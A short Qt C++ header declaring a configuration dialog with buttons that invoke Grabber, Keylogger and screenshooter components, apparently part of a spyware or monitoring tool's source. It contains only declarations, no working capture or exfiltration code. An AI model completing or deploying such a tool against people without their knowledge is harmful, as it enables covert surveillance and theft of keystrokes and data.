#ifndef CONFIGE_H
#define CONFIGE_H

#include <QDialog>
#include "grabber.h"
#include "keylogger.h"
#include "screenshooter.h"

namespace Ui {
class ConfigE;
}

class ConfigE : public QDialog
{
    Q_OBJECT

public:
    explicit ConfigE(QWidget *parent = 0);
    ~ConfigE();

private slots:
    void on_CallGrabber_clicked();

    void on_CallKeylogger_clicked();

    void on_CallScreenshooter_clicked();

private:
    Ui::ConfigE *ui;
    Grabber G;
    Keylogger K;
    screenshooter S;
};

#endif // CONFIGE_H
